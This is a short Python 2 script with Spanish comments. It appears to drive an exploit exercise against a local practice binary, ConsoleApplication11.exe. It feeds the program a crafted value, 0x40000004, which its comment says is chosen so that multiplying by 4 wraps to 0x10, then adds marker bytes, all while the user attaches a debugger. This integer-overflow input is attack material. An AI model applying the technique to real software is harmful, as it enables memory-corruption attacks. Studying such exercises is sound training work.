from os import *
import struct


stdin,stdout = popen4(r'ConsoleApplication11.exe')
print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()


fruta="1073741828\n41\n42\n43\n44\n45\n46\n1094861636\n" #0x40000004 para que al multiplicar por 4 de 0x10

print stdin


print "Escribe: " + fruta
stdin.write(fruta)
print stdout.read(40)


